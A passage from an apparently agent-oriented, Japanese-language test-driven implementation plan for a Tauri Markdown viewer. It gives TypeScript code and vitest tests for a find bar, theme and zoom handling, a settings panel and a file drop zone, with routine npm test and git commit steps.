    hits[index]?.scrollIntoView({ block: "center" });
  }

  private highlightMatches(query: string): number {
    const content = this.contentEl();
    if (!content) {
      return 0;
    }
    const needle = query.toLowerCase();
    const textNodes = this.collectTextNodes(content);
    let count = 0;
    for (const node of textNodes) {
      count += this.wrapNodeMatches(node, needle);
    }
    return count;
  }

  private wrapNodeMatches(node: Text, needle: string): number {
    const text = node.nodeValue ?? "";
    const lower = text.toLowerCase();
    let from = lower.indexOf(needle);
    if (from === -1) {
      return 0;
    }
    const fragment = document.createDocumentFragment();
    let cursor = 0;
    let count = 0;
    while (from !== -1) {
      if (from > cursor) {
        fragment.appendChild(document.createTextNode(text.slice(cursor, from)));
      }
      const mark = document.createElement("mark");
      mark.className = HIT_CLASS;
      mark.textContent = text.slice(from, from + needle.length);
      fragment.appendChild(mark);
      count += 1;
      cursor = from + needle.length;
      from = lower.indexOf(needle, cursor);
    }
    if (cursor < text.length) {
      fragment.appendChild(document.createTextNode(text.slice(cursor)));
    }
    node.parentNode?.replaceChild(fragment, node);
    return count;
  }

  private collectTextNodes(root: HTMLElement): Text[] {
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, {
      acceptNode: (node) => {
        const parent = node.parentElement;
        if (!parent) {
          return NodeFilter.FILTER_REJECT;
        }
        const tag = parent.tagName;
        if (tag === "SCRIPT" || tag === "STYLE" || parent.classList.contains(HIT_CLASS)) {
          return NodeFilter.FILTER_REJECT;
        }
        return (node.nodeValue ?? "").trim().length > 0
          ? NodeFilter.FILTER_ACCEPT
          : NodeFilter.FILTER_REJECT;
      },
    });
    const nodes: Text[] = [];
    let current = walker.nextNode();
    while (current) {
      nodes.push(current as Text);
      current = walker.nextNode();
    }
    return nodes;
  }

  private clearHighlights(): void {
    const content = this.contentEl();
    if (!content) {
      return;
    }
    const marks = content.querySelectorAll(`mark.${HIT_CLASS}`);
    marks.forEach((mark) => {
      const parent = mark.parentNode;
      if (!parent) {
        return;
      }
      parent.replaceChild(document.createTextNode(mark.textContent ?? ""), mark);
      parent.normalize();
    });
  }

  private hits(): HTMLElement[] {
    const content = this.contentEl();
    if (!content) {
      return [];
    }
    return Array.from(content.querySelectorAll<HTMLElement>(`mark.${HIT_CLASS}`));
  }

  private renderCount(count: number): void {
    const el = this.root.querySelector<HTMLElement>("#findbar-count");
    if (!el) {
      return;
    }
    el.textContent = count === 0 ? "" : `${this.currentIndex + 1}/${count}`;
  }

  private findbarEl(): HTMLElement | null {
    return this.root.querySelector<HTMLElement>("#findbar");
  }

  private inputEl(): HTMLInputElement | null {
    return this.root.querySelector<HTMLInputElement>("#findbar-input");
  }

  private contentEl(): HTMLElement | null {
    return this.root.querySelector<HTMLElement>("#content");
  }
}
```

- [ ] **Step 4: テストを実行して PASS を確認する**

Run:
```bash
npm run test -- src/ui/find.test.ts
```
Expected: `PASS src/ui/find.test.ts` — `FindBar.search` の 3 テストが全て成功する（`Test Files 1 passed`、`Tests 3 passed`）。

- [ ] **Step 5: close()／next() の挙動の失敗テストを追加する**

何をするか: `close()` が全 `mark` を除去すること、`next()` が現在インデックスをマッチ数で剰余移動することを検証するテストを `find.test.ts` に追記する。なぜ必要か: トグルと巡回の仕様（modulo 前進）を固定するため。どう書くか:

```ts
// src/ui/find.test.ts に追記
describe("FindBar.close", () => {
  it("removes all marks and resets the input", () => {
    const root = buildRoot("<p>foo foo foo</p>");
    const bar = new FindBar(root);
    bar.open();
    bar.search("foo");
    expect(root.querySelectorAll("mark.find-hit").length).toBe(3);

    bar.close();

    expect(root.querySelectorAll("mark.find-hit").length).toBe(0);
    expect(root.querySelector<HTMLInputElement>("#findbar-input")?.value).toBe("");
    expect(root.querySelector<HTMLElement>("#findbar")?.hidden).toBe(true);
    expect(root.querySelector("#content")?.textContent).toBe("foo foo foo");
  });
});

describe("FindBar.next/prev", () => {
  it("advances the current index modulo the match count", () => {
    const root = buildRoot("<p>foo foo foo</p>");
    const bar = new FindBar(root);
    bar.open();
    bar.search("foo");

    const hits = () => Array.from(root.querySelectorAll("mark.find-hit"));
    expect(hits()[0].classList.contains("find-hit-current")).toBe(true);

    bar.next();
    expect(hits()[1].classList.contains("find-hit-current")).toBe(true);

    bar.next();
    expect(hits()[2].classList.contains("find-hit-current")).toBe(true);

    bar.next(); // wraps back to first (modulo)
    expect(hits()[0].classList.contains("find-hit-current")).toBe(true);

    bar.prev(); // wraps back to last
    expect(hits()[2].classList.contains("find-hit-current")).toBe(true);
  });
});
```

- [ ] **Step 6: 追記テストを実行して PASS を確認する**

何をするか: Step 3 の実装が `close()`／`next()`／`prev()` 仕様を満たすことを確認する。なぜ必要か: 実装に追加変更が要るかを切り分けるため（jsdom には `scrollIntoView` が無いので必要なら次 Step で対処する）。

Run:
```bash
npm run test -- src/ui/find.test.ts
```
Expected: `scrollIntoView is not a function` で `FindBar.next/prev` が FAIL する可能性が高い（jsdom は `Element.prototype.scrollIntoView` を実装しないため）。`FindBar.close` は PASS。

- [ ] **Step 7: jsdom 向けに scrollIntoView をガードする**

何をするか: `setCurrent` のスクロール呼び出しを存在チェックでガードする。なぜ必要か: jsdom にレイアウト API が無くてもロジックテストを通すため、かつ実環境では正しくスクロールするため。どう書くか:

```ts
// src/ui/find.ts の setCurrent 内、最終行を置き換える
    this.currentIndex = index;
    const target = hits[index];
    if (target && typeof target.scrollIntoView === "function") {
      target.scrollIntoView({ block: "center" });
    }
```

- [ ] **Step 8: テストを再実行して PASS を確認する**

Run:
```bash
npm run test -- src/ui/find.test.ts
```
Expected: `PASS src/ui/find.test.ts` — `Tests 5 passed`（FindBar.search 3 + FindBar.close 1 + FindBar.next/prev 1 = 5 個の `it`）。全テスト成功。

- [ ] **Step 9: main.ts に Cmd/Ctrl+F のキーバインドと Escape を配線する**

※ ここで示す main.ts 断片は段階的な途中形。最終的な統合済み main.ts は Task 15 Step 12 を正とする（差分はそこで吸収）。

何をするか: `main.ts` の起動処理に `FindBar` を生成し、Cmd/Ctrl+F で `open()`、入力イベントで `search()`、Enter/Shift+Enter で `next()`/`prev()`、Escape で `close()` を呼ぶ配線を加える。なぜ必要か: 検索 UI をキーボードから使えるようにするため。どう書くか（`main.ts` の末尾、bootstrap 完了後に追記する想定）:

```ts
// src/main.ts に追記（import 部）
import { FindBar } from "./ui/find";

// src/main.ts の bootstrap 内（document.body をルートに）
function wireFindBar(root: HTMLElement): void {
  const findBar = new FindBar(root);
  const input = root.querySelector<HTMLInputElement>("#findbar-input");

  window.addEventListener("keydown", (event) => {
    const isAccel = event.metaKey || event.ctrlKey;
    if (isAccel && event.key.toLowerCase() === "f") {
      event.preventDefault();
      findBar.open();
      return;
    }
    if (event.key === "Escape") {
      findBar.close();
    }
  });

  input?.addEventListener("input", () => {
    findBar.search(input.value);
  });

  input?.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      if (event.shiftKey) {
        findBar.prev();
      } else {
        findBar.next();
      }
    }
  });
}
```

そして bootstrap の実行箇所で `wireFindBar(document.body);` を呼び出す。

- [ ] **Step 10: 全フロントテストを実行して回帰が無いことを確認する**

Run:
```bash
npm run test -- src/ui
```
Expected: `PASS src/ui/find.test.ts` を含め `src/ui` 配下のテストが全て成功する（`Test Files` 全 passed）。

- [ ] **Step 11: 変更をコミットする**

Run:
```bash
git add src/ui/find.ts src/ui/find.test.ts src/main.ts && git commit -m "feat: add FindBar with text-node search, highlight, and Cmd/Ctrl+F wiring"
```
Expected: 1 ファイル新規（find.ts）＋1 テスト＋main.ts 変更を含むコミットが作成される。

### Task 14: テーマ解決（theme.ts）とズーム（zoom.ts）

このタスクでは `src/ui/theme.ts`（`resolveTheme`：`"system"` は `matchMedia('(prefers-color-scheme: dark)')` を参照、`applyTheme` は `<html>` の `data-theme` を設定し `system` のときは OS 変更を購読する）と `src/ui/zoom.ts`（ルート font-size スケール、`zoomIn`/`zoomOut`/`resetZoom` はクランプ）を TDD で実装する。最後に `main.ts` に Cmd/Ctrl +/-/0 を配線し、起動時に設定からテーマを適用する。jsdom は `matchMedia` を持たないためモックする。

- [ ] **Step 1: resolveTheme / applyTheme の失敗テストを書く**

`src/ui/theme.test.ts` を新規作成する。何をするか: `resolveTheme("dark")=="dark"`、`resolveTheme("light")=="light"`、`resolveTheme("system")` がモックした matchMedia に追従すること、`applyTheme` が `<html>` の `data-theme` を解決後の値で設定することを検証する。なぜ必要か: テーマ解決と適用の純粋ロジックを固定するため。どう書くか:

```ts
// src/ui/theme.test.ts
import { afterEach, describe, expect, it, vi } from "vitest";
import { applyFont, applyTheme, resolveTheme } from "./theme";

function mockMatchMedia(prefersDark: boolean): void {
  vi.stubGlobal("matchMedia", (query: string) => ({
    matches: query.includes("dark") ? prefersDark : !prefersDark,
    media: query,
    onchange: null,
    addEventListener: vi.fn(),
    removeEventListener: vi.fn(),
    addListener: vi.fn(),
    removeListener: vi.fn(),
    dispatchEvent: vi.fn(),
  }));
}

afterEach(() => {
  vi.unstubAllGlobals();
  document.documentElement.removeAttribute("data-theme");
  document.documentElement.style.removeProperty("--app-font");
});

describe("resolveTheme", () => {
  it("returns the explicit value for light and dark", () => {
    expect(resolveTheme("light")).toBe("light");
    expect(resolveTheme("dark")).toBe("dark");
  });

  it("follows matchMedia when system prefers dark", () => {
    mockMatchMedia(true);
    expect(resolveTheme("system")).toBe("dark");
  });

  it("follows matchMedia when system prefers light", () => {
    mockMatchMedia(false);
    expect(resolveTheme("system")).toBe("light");
  });
});

describe("applyTheme", () => {
  it("sets data-theme on <html> to the resolved value", () => {
    mockMatchMedia(true);
    applyTheme("system");
    expect(document.documentElement.getAttribute("data-theme")).toBe("dark");

    applyTheme("light");
    expect(document.documentElement.getAttribute("data-theme")).toBe("light");
  });

  it("subscribes to OS changes only when theme is system", () => {
    const addEventListener = vi.fn();
    vi.stubGlobal("matchMedia", () => ({
      matches: true,
      media: "(prefers-color-scheme: dark)",
      onchange: null,
      addEventListener,
      removeEventListener: vi.fn(),
      addListener: vi.fn(),
      removeListener: vi.fn(),
      dispatchEvent: vi.fn(),
    }));

    applyTheme("system");
    expect(addEventListener).toHaveBeenCalledWith("change", expect.any(Function));

    addEventListener.mockClear();
    applyTheme("dark");
    expect(addEventListener).not.toHaveBeenCalled();
  });
});

describe("applyFont", () => {
  it("sets --app-font on <html> when a family is given", () => {
    applyFont("Inter");
    expect(document.documentElement.style.getPropertyValue("--app-font")).toBe("Inter");
  });

  it("clears --app-font when family is null", () => {
    applyFont("Inter");
    applyFont(null);
    expect(document.documentElement.style.getPropertyValue("--app-font")).toBe("");
  });
});
```

- [ ] **Step 2: テストを実行して FAIL を確認する**

Run:
```bash
npm run test -- src/ui/theme.test.ts
```
Expected: `FAIL src/ui/theme.test.ts` — `Failed to resolve import "./theme"`（モジュール未作成）。

- [ ] **Step 3: theme.ts を実装する**

何をするか: `resolveTheme`／`applyTheme`／`applyFont` を実装し、`system` のときだけ OS テーマ変更を 1 つの購読にまとめる。`applyFont` は spec §10 の `fontFamily` 設定を `<html>` の CSS 変数 `--app-font` へ反映する（null/未指定なら変数を外して既定スタックへフォールバック）。なぜ必要か: Step 1 のテストを通し、再適用時に購読が重複しないようにするため。どう書くか:

```ts
// src/ui/theme.ts
export type Theme = "system" | "light" | "dark";

const DARK_QUERY = "(prefers-color-scheme: dark)";

let mediaQuery: MediaQueryList | null = null;
let mediaListener: ((event: MediaQueryListEvent) => void) | null = null;

export function resolveTheme(t: Theme): "light" | "dark" {
  if (t === "light" || t === "dark") {
    return t;
  }
  if (typeof matchMedia === "function" && matchMedia(DARK_QUERY).matches) {
    return "dark";
  }
  return "light";
}

export function applyTheme(t: Theme): void {
  document.documentElement.setAttribute("data-theme", resolveTheme(t));
  detachMediaListener();
  if (t === "system" && typeof matchMedia === "function") {
    mediaQuery = matchMedia(DARK_QUERY);
    mediaListener = () => {
      document.documentElement.setAttribute("data-theme", resolveTheme("system"));
    };
    mediaQuery.addEventListener("change", mediaListener);
  }
}

/**
 * Apply the body font-family by setting/clearing the --app-font CSS variable
 * on <html>. The body CSS uses `font-family: var(--app-font, <default stack>)`,
 * so clearing the variable falls back to the default stack.
 */
export function applyFont(family: string | null): void {
  const el = document.documentElement;
  if (family) {
    el.style.setProperty("--app-font", family);
  } else {
    el.style.removeProperty("--app-font");
  }
}

function detachMediaListener(): void {
  if (mediaQuery && mediaListener) {
    mediaQuery.removeEventListener("change", mediaListener);
  }
  mediaQuery = null;
  mediaListener = null;
}
```

- [ ] **Step 4: テストを実行して PASS を確認する**

Run:
```bash
npm run test -- src/ui/theme.test.ts
```
Expected: `PASS src/ui/theme.test.ts` — `Tests 7 passed`（resolveTheme 3 + applyTheme 2 + applyFont 2）。全テスト成功。

- [ ] **Step 5: setZoom のクランプの失敗テストを書く**

`src/ui/zoom.test.ts` を新規作成する。何をするか: `setZoom` が `[0.5, 3]` にクランプして `document.documentElement.style.fontSize` を更新すること、`zoomIn`/`zoomOut`/`resetZoom` がステップ移動・リセットすることを検証する。なぜ必要か: ズーム倍率の境界仕様を固定するため。どう書くか:

```ts
// src/ui/zoom.test.ts
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { resetZoom, setZoom, zoomIn, zoomOut } from "./zoom";

const BASE_PX = 16;

beforeEach(() => {
  resetZoom();
});

afterEach(() => {
  document.documentElement.style.fontSize = "";
});

describe("setZoom", () => {
  it("scales root font-size from the 16px base", () => {
    setZoom(1.5);
    expect(document.documentElement.style.fontSize).toBe(`${BASE_PX * 1.5}px`);
  });

  it("clamps below 0.5", () => {
    setZoom(0.1);
    expect(document.documentElement.style.fontSize).toBe(`${BASE_PX * 0.5}px`);
  });

  it("clamps above 3", () => {
    setZoom(10);
    expect(document.documentElement.style.fontSize).toBe(`${BASE_PX * 3}px`);
  });
});

describe("zoomIn/zoomOut/resetZoom", () => {
  it("zoomIn increases by one step and stays clamped", () => {
    resetZoom();
    zoomIn();
    expect(document.documentElement.style.fontSize).toBe(`${BASE_PX * 1.1}px`);
  });

  it("zoomOut decreases by one step", () => {
    resetZoom();
    zoomOut();
    expect(document.documentElement.style.fontSize).toBe(`${BASE_PX * 0.9}px`);
  });

  it("resetZoom returns to 1.0", () => {
    setZoom(2);
    resetZoom();
    expect(document.documentElement.style.fontSize).toBe(`${BASE_PX}px`);
  });
});
```

- [ ] **Step 6: テストを実行して FAIL を確認する**

Run:
```bash
npm run test -- src/ui/zoom.test.ts
```
Expected: `FAIL src/ui/zoom.test.ts` — `Failed to resolve import "./zoom"`（モジュール未作成）。

- [ ] **Step 7: zoom.ts を実装する**

何をするか: ルート font-size を 16px 基準でスケールするズーム関数群を実装し、倍率を `[0.5, 3]` にクランプする。なぜ必要か: Step 5 のテストを通すため。どう書くか:

```ts
// src/ui/zoom.ts
const BASE_FONT_PX = 16;
const MIN_ZOOM = 0.5;
const MAX_ZOOM = 3;
const STEP = 0.1;

let currentZoom = 1;

function clamp(level: number): number {
  if (level < MIN_ZOOM) {
    return MIN_ZOOM;
  }
  if (level > MAX_ZOOM) {
    return MAX_ZOOM;
  }
  return level;
}

export function setZoom(level: number): void {
  currentZoom = clamp(level);
  document.documentElement.style.fontSize = `${BASE_FONT_PX * currentZoom}px`;
}

export function zoomIn(): void {
  setZoom(currentZoom + STEP);
}

export function zoomOut(): void {
  setZoom(currentZoom - STEP);
}

export function resetZoom(): void {
  setZoom(1);
}
```

- [ ] **Step 8: テストを実行して PASS を確認する**

Run:
```bash
npm run test -- src/ui/zoom.test.ts
```
Expected: `PASS src/ui/zoom.test.ts` — `Tests 6 passed`。`zoomIn` 後が `17.6px`、`zoomOut` 後が `14.4px`、クランプ境界が `8px`／`48px` になる（浮動小数の表記は `${16*1.1}` 評価で一致）。全テスト成功。

- [ ] **Step 9: main.ts に Cmd/Ctrl +/-/0 の配線と起動時テーマ適用を加える**

※ ここで示す main.ts 断片は段階的な途中形。最終的な統合済み main.ts は Task 15 Step 12 を正とする（差分はそこで吸収）。

何をするか: `main.ts` で起動時に `get_settings` でテーマを取得して `applyTheme` し、Cmd/Ctrl の `+`/`=`/`-`/`0` で `zoomIn`/`zoomOut`/`resetZoom` を呼ぶキーバインドを加える。なぜ必要か: テーマ適用とズーム操作をキーボードから使えるようにするため。どう書くか（`main.ts` に追記）:

```ts
// src/main.ts に追記（import 部）
import { invoke } from "@tauri-apps/api/core";
import { applyTheme } from "./ui/theme";
import { resetZoom, zoomIn, zoomOut } from "./ui/zoom";
import type { Settings } from "./types";

// src/main.ts の bootstrap 内: 起動時にテーマを適用する
async function applyThemeFromSettings(): Promise<void> {
  const settings = await invoke<Settings>("get_settings");
  applyTheme(settings.theme);
}

// src/main.ts の bootstrap 内: ズームのキーバインドを配線する
function wireZoom(): void {
  window.addEventListener("keydown", (event) => {
    const isAccel = event.metaKey || event.ctrlKey;
    if (!isAccel) {
      return;
    }
    if (event.key === "+" || event.key === "=") {
      event.preventDefault();
      zoomIn();
    } else if (event.key === "-") {
      event.preventDefault();
      zoomOut();
    } else if (event.key === "0") {
      event.preventDefault();
      resetZoom();
    }
  });
}
```

そして bootstrap で `await applyThemeFromSettings();` と `wireZoom();` を呼び出す（`Settings` 型は `src/types.ts` で定義済みのものを使う。未エクスポートの場合は `interface Settings { theme: "system"|"light"|"dark"; sessionRestore: boolean; autoReload: boolean; fontFamily: string|null; fontSize: number; defaultEncoding: string }` をローカルに定義する）。

- [ ] **Step 10: 全フロントテストを実行して回帰が無いことを確認する**

Run:
```bash
npm run test -- src/ui
```
Expected: `src/ui/find.test.ts`／`src/ui/theme.test.ts`／`src/ui/zoom.test.ts` が全て `PASS`（`Test Files 3 passed` 以上）。

- [ ] **Step 11: 変更をコミットする**

Run:
```bash
git add src/ui/theme.ts src/ui/theme.test.ts src/ui/zoom.ts src/ui/zoom.test.ts src/main.ts && git commit -m "feat: add theme resolution and zoom controls with Cmd/Ctrl keybindings"
```
Expected: theme.ts／zoom.ts と各テスト、main.ts 変更を含むコミットが作成される。

### Task 15: フロント設定パネル・ドロップゾーン・自動リロード配線

この Task では 3 つの UI モジュールを TDD で実装する。`mountSettingsPanel`（設定フォーム）、`mountDropZone`（ドラッグ&ドロップ＋「開く」ボタン）、`wireAutoReload`（`file-changed` / `file-removed` を `autoReload` 設定に従って配線）。すべて jsdom 上で単体テスト可能にするため、Tauri API はモックし、ドロップパス抽出は純関数 `extractDroppedPath` に切り出す。

前提となる PINNED CONTRACTS のうち本 Task が依存する公開名: `Settings`（`src/types.ts`）, `LoadedFile`（`src/types.ts`）, `applyTheme` / `Theme`（`src/ui/theme.ts`）, `setZoom`（`src/ui/zoom.ts`）, コマンド `open_in_new_window` / `open_file_dialog`, イベント `file-changed` / `file-removed`。これらは他エリアで定義済みとして使う。

- [ ] **Step 1: vitest の jsdom 設定を確認する**

`vite.config.ts` は Task 1 で既に作成済みで、`test` ブロック（`environment: "jsdom"` / `globals: true` / `include: ["tests/**/*.test.ts", "src/**/*.test.ts"]`）と Tauri 連携用の `server`/`build` 設定を含んでいる。本 Task で `vite.config.ts` を新規に上書きしてはならない（Tauri の固定ポート 1420 等の設定を壊すため）。`src/**/*.test.ts` が include 対象に入っていることだけを確認し、入っていなければ Task 1 の `test.include` に `src/**/*.test.ts` を追記する（Tauri 設定はそのまま残す）。

Run: `npm run test -- --run src/ui`
Expected: テストファイルがまだ無いため `No test files found` 相当（この時点では実行確認のみ。失敗扱いにしない）。

- [ ] **Step 2: settingsPanel の失敗テストを書く（描画と onChange）**

設定値がフォームへ反映され、各コントロールの変更で `set()` が変異後オブジェクト付きで呼ばれ、theme 変更で `applyTheme`、fontSize 変更で `setZoom` が呼ばれることを検証する。Tauri に触れないモジュールなので theme/zoom のみモックする。

```ts
// src/ui/settingsPanel.test.ts
import { describe, it, expect, vi, beforeEach } from "vitest";

const applyTheme = vi.fn();
const applyFont = vi.fn();
const setZoom = vi.fn();
vi.mock("./theme", () => ({
  applyTheme: (...a: unknown[]) => applyTheme(...a),
  applyFont: (...a: unknown[]) => applyFont(...a),
}));
vi.mock("./zoom", () => ({ setZoom: (...a: unknown[]) => setZoom(...a) }));

import { mountSettingsPanel } from "./settingsPanel";
import type { Settings } from "../types";

const baseSettings: Settings = {
  theme: "dark",
  sessionRestore: true,
  autoReload: false,
  fontFamily: "Inter",
  fontSize: 18,
  defaultEncoding: "Shift_JIS",
};

describe("mountSettingsPanel", () => {
  let root: HTMLElement;
  beforeEach(() => {
    applyTheme.mockClear();
    applyFont.mockClear();
    setZoom.mockClear();
    root = document.createElement("div");
    document.body.appendChild(root);
  });

  it("reflects the given settings into the form controls", async () => {
    const get = vi.fn(async () => baseSettings);
    const set = vi.fn(async () => {});
    mountSettingsPanel(root, get, set);
    await Promise.resolve();
    await Promise.resolve();

    const theme = root.querySelector<HTMLSelectElement>('[data-field="theme"]')!;
    const sessionRestore = root.querySelector<HTMLInputElement>('[data-field="sessionRestore"]')!;
    const autoReload = root.querySelector<HTMLInputElement>('[data-field="autoReload"]')!;
    const fontFamily = root.querySelector<HTMLInputElement>('[data-field="fontFamily"]')!;
    const fontSize = root.querySelector<HTMLInputElement>('[data-field="fontSize"]')!;
    const enc = root.querySelector<HTMLSelectElement>('[data-field="defaultEncoding"]')!;

    expect(theme.value).toBe("dark");
    expect(sessionRestore.checked).toBe(true);
    expect(autoReload.checked).toBe(false);
    expect(fontFamily.value).toBe("Inter");
    expect(fontSize.value).toBe("18");
    expect(enc.value).toBe("Shift_JIS");
  });

  it("calls set() with the mutated object and applies theme/zoom live on change", async () => {
    const get = vi.fn(async () => baseSettings);
    const set = vi.fn(async () => {});
    mountSettingsPanel(root, get, set);
    await Promise.resolve();
    await Promise.resolve();

    const theme = root.querySelector<HTMLSelectElement>('[data-field="theme"]')!;
    theme.value = "light";
    theme.dispatchEvent(new Event("change"));
    expect(set).toHaveBeenCalledWith(expect.objectContaining({ theme: "light" }));
    expect(applyTheme).toHaveBeenCalledWith("light");

    const fontSize = root.querySelector<HTMLInputElement>('[data-field="fontSize"]')!;
    fontSize.value = "22";
    fontSize.dispatchEvent(new Event("change"));
    expect(set).toHaveBeenLastCalledWith(expect.objectContaining({ fontSize: 22 }));
    expect(setZoom).toHaveBeenCalledWith(22 / 16);

    const sessionRestore = root.querySelector<HTMLInputElement>('[data-field="sessionRestore"]')!;
    sessionRestore.checked = false;
    sessionRestore.dispatchEvent(new Event("change"));
    expect(set).toHaveBeenLastCalledWith(expect.objectContaining({ sessionRestore: false }));
  });
});
```

Run: `npm run test -- --run src/ui/settingsPanel.test.ts`
Expected: FAIL — `Failed to resolve import "./settingsPanel"`（モジュール未実装）。

- [ ] **Step 3: settingsPanel を最小実装する**

`fontSize` 基準は 16px（zoom 倍率 = fontSize/16）。各コントロールに `data-field` を付け、`change` で現在値から新 `Settings` を組み立てて `set()` を呼び、theme は `applyTheme`、fontSize は `setZoom` を即時適用する。

```ts
// src/ui/settingsPanel.ts
import type { Settings } from "../types";
import { applyFont, applyTheme } from "./theme";
import { setZoom } from "./zoom";

const BASE_FONT_SIZE = 16;
const THEMES: Array<Settings["theme"]> = ["system", "light", "dark"];
const ENCODINGS = ["UTF-8", "UTF-16LE", "UTF-16BE", "Shift_JIS", "EUC-JP"];

function makeSelect(field: keyof Settings, options: string[]): HTMLSelectElement {
  const el = document.createElement("select");
  el.dataset.field = String(field);
  for (const opt of options) {
    const o = document.createElement("option");
    o.value = opt;
    o.textContent = opt;
    el.appendChild(o);
  }
  return el;
}

function makeRow(labelText: string, control: HTMLElement): HTMLElement {
  const row = document.createElement("label");
  row.className = "settings-row";
  const span = document.createElement("span");
  span.className = "settings-label";
  span.textContent = labelText;
  row.appendChild(span);
  row.appendChild(control);
  return row;
}

export function mountSettingsPanel(
  root: HTMLElement,
  get: () => Promise<Settings>,
  set: (s: Settings) => Promise<void>,
): void {
  const panel = document.createElement("form");
  panel.className = "settings-panel";

  const theme = makeSelect("theme", THEMES);
  const defaultEncoding = makeSelect("defaultEncoding", ENCODINGS);

  const sessionRestore = document.createElement("input");
  sessionRestore.type = "checkbox";
  sessionRestore.dataset.field = "sessionRestore";

  const autoReload = document.createElement("input");
  autoReload.type = "checkbox";
  autoReload.dataset.field = "autoReload";

  const fontFamily = document.createElement("input");
  fontFamily.type = "text";
  fontFamily.dataset.field = "fontFamily";
  fontFamily.placeholder = "(system default)";

  const fontSize = document.createElement("input");
  fontSize.type = "number";
  fontSize.min = "8";
  fontSize.max = "48";
  fontSize.dataset.field = "fontSize";

  panel.appendChild(makeRow("Theme", theme));
  panel.appendChild(makeRow("Restore session", sessionRestore));
  panel.appendChild(makeRow("Auto reload", autoReload));
  panel.appendChild(makeRow("Font family", fontFamily));
  panel.appendChild(makeRow("Font size (px)", fontSize));
  panel.appendChild(makeRow("Default encoding", defaultEncoding));
  panel.addEventListener("submit", (e) => e.preventDefault());
  root.appendChild(panel);

  let current: Settings;

  function readForm(): Settings {
    const size = Number.parseInt(fontSize.value, 10);
    return {
      theme: theme.value as Settings["theme"],
      sessionRestore: sessionRestore.checked,
      autoReload: autoReload.checked,
      fontFamily: fontFamily.value.trim() === "" ? null : fontFamily.value,
      fontSize: Number.isFinite(size) ? size : BASE_FONT_SIZE,
      defaultEncoding: defaultEncoding.value,
    };
  }

  async function persist(next: Settings): Promise<void> {
    current = next;
    await set(next);
  }

  function onChange(): void {
    const next = readForm();
    applyTheme(next.theme);
    applyFont(next.fontFamily);
    setZoom(next.fontSize / BASE_FONT_SIZE);
    void persist(next);
  }

  for (const el of [theme, sessionRestore, autoReload, fontFamily, fontSize, defaultEncoding]) {
    el.addEventListener("change", onChange);
  }

  void get().then((s) => {
    current = s;
    theme.value = s.theme;
    sessionRestore.checked = s.sessionRestore;
    autoReload.checked = s.autoReload;
    fontFamily.value = s.fontFamily ?? "";
    fontSize.value = String(s.fontSize);
    defaultEncoding.value = s.defaultEncoding;
  });
}
```

Run: `npm run test -- --run src/ui/settingsPanel.test.ts`
Expected: PASS（2 tests passed）。

- [ ] **Step 4: settingsPanel をコミットする**

```bash
git add src/ui/settingsPanel.ts src/ui/settingsPanel.test.ts
git commit -m "feat(ui): add settings panel bound to Settings with live theme/zoom"
```

- [ ] **Step 5: extractDroppedPath の失敗テストを書く（純関数）**

※ `extractDroppedPath`（`dropzone.ts`）は契約に明記された公開シンボルではなく、テスト容易性のために `mountDropZone` のパス抽出ロジックを切り出した内部ヘルパ。

Tauri webview の drag-drop（`{ paths: string[] }`）と、DOM の `DragEvent`（`.path` を持つ File、または無し）双方からパスを取り出す純関数を切り出してテストする。

```ts
// src/ui/dropzone.test.ts
import { describe, it, expect, vi, beforeEach } from "vitest";

const invoke = vi.fn();
const onDragDropEvent = vi.fn(async () => () => {});
vi.mock("@tauri-apps/api/core", () => ({ invoke: (...a: unknown[]) => invoke(...a) }));
vi.mock("@tauri-apps/api/webviewWindow", () => ({
  getCurrentWebviewWindow: () => ({ onDragDropEvent }),
}));

import { extractDroppedPath, mountDropZone } from "./dropzone";

describe("extractDroppedPath", () => {
  it("returns the first path from a Tauri drag-drop payload", () => {
    expect(extractDroppedPath({ paths: ["/a/b/readme.md", "/a/b/x.md"] })).toBe("/a/b/readme.md");
  });

  it("returns null for an empty Tauri payload", () => {
    expect(extractDroppedPath({ paths: [] })).toBeNull();
  });

  it("reads .path from a DOM-dropped File when present", () => {
    const file = new File(["x"], "n.md");
    Object.defineProperty(file, "path", { value: "/dom/n.md" });
    const dt = { files: [file] } as unknown as DataTransfer;
    const ev = { dataTransfer: dt } as unknown as DragEvent;
    expect(extractDroppedPath(ev)).toBe("/dom/n.md");
  });

  it("returns null for a DragEvent without a usable path", () => {
    const ev = { dataTransfer: { files: [] } } as unknown as DragEvent;
    expect(extractDroppedPath(ev)).toBeNull();
  });
});
```

Run: `npm run test -- --run src/ui/dropzone.test.ts`
Expected: FAIL — `Failed to resolve import "./dropzone"`。

- [ ] **Step 6: mountDropZone の失敗テストを追記する（onOpen 呼び出し）**

Tauri の `onDragDropEvent` 経由で drop が来たら `onOpen(path)` が呼ばれ、`open_in_new_window` が invoke されること、「開く」ボタンで `open_file_dialog` を invoke しパスを `onOpen` へ渡すことを検証する。同じテストファイルに追記する。

```ts
// src/ui/dropzone.test.ts （末尾に追記）
describe("mountDropZone", () => {
  let root: HTMLElement;
  beforeEach(() => {
    invoke.mockReset();
    onDragDropEvent.mockClear();
    root = document.createElement("div");
    document.body.appendChild(root);
  });

  it("calls onOpen with the dropped path via the Tauri drag-drop event", async () => {
    let handler: (e: { payload: { type: string; paths?: string[] } }) => void = () => {};
    onDragDropEvent.mockImplementation(async (cb: typeof handler) => {
      handler = cb;
      return () => {};
    });
    const onOpen = vi.fn();
    mountDropZone(root, onOpen);
    await Promise.resolve();

    handler({ payload: { type: "drop", paths: ["/dropped/file.md"] } });
    expect(onOpen).toHaveBeenCalledWith("/dropped/file.md");
  });

  it("opens the native dialog from the Open button and routes the path", async () => {
    invoke.mockResolvedValue("/picked/doc.md");
    const onOpen = vi.fn();
    mountDropZone(root, onOpen);
    await Promise.resolve();

    const btn = root.querySelector<HTMLButtonElement>('[data-action="open"]')!;
    btn.click();
    await Promise.resolve();
    await Promise.resolve();

    expect(invoke).toHaveBeenCalledWith("open_file_dialog");
    expect(onOpen).toHaveBeenCalledWith("/picked/doc.md");
  });

  it("does not call onOpen when the dialog is cancelled (null)", async () => {
    invoke.mockResolvedValue(null);
    const onOpen = vi.fn();
    mountDropZone(root, onOpen);
    await Promise.resolve();

    const btn = root.querySelector<HTMLButtonElement>('[data-action="open"]')!;
    btn.click();
    await Promise.resolve();
    await Promise.resolve();

    expect(onOpen).not.toHaveBeenCalled();
  });
});
```

Run: `npm run test -- --run src/ui/dropzone.test.ts`
